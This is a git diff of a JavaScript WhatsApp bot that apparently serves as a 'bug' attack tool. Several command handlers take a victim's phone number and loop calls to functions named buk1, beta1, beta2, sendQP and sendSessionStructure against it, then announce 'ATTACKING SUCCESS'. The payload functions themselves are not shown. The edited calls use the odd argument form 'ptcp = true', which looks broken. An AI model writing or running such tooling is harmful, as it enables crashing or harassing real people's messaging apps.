@@ -2134,11 +2134,12 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-sendQP(target, { ptcp: true });
-await sendQP(target, { ptcp: true });
-await beta2(target, { ptcp: true });
-await sendSessionStructure(target, { ptcp: true });
-await beta1(target, { ptcp: true });
+await buk1(viper, target, ptcp = true);
+sendQP(target, wanted);
+await sendQP(target, wanted);
+await beta2(viper, target, ptcp = true);
+await sendSessionStructure(target, wanted);
+await beta1(viper, target, ptcp = true);
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
@@ -2154,12 +2155,12 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, { ptcp: true });
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(viper, target, { ptcp: true });
-await sendSessionStructure(target, wanted)
-await beta1(viper, target, { ptcp: true });
+await buk1(viper, target, ptcp = true);
+sendQP(target, wanted);
+await sendQP(target, wanted);
+await beta2(viper, target, ptcp = true);
+await sendSessionStructure(target, wanted);
+await beta1(viper, target, ptcp = true);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2176,12 +2177,12 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, { ptcp: true });
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(viper, target, { ptcp: true });
-await sendSessionStructure(target, wanted)
-await beta1(viper, target, { ptcp: true });
+await buk1(viper, target, ptcp = true);
+sendQP(target, wanted);
+await sendQP(target, wanted);
+await beta2(viper, target, ptcp = true);
+await sendSessionStructure(target, wanted);
+await beta1(viper, target, ptcp = true);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2219,12 +2220,12 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, { ptcp: true });
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(viper, target, { ptcp: true });
-await sendSessionStructure(target, wanted)
-await beta1(viper, target, { ptcp: true });
+await buk1(viper, target, ptcp = true);
+sendQP(target, wanted);
+await sendQP(target, wanted);
+await beta2(viper, target, ptcp = true);
+await sendSessionStructure(target, wanted);
+await beta1(viper, target, ptcp = true);
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
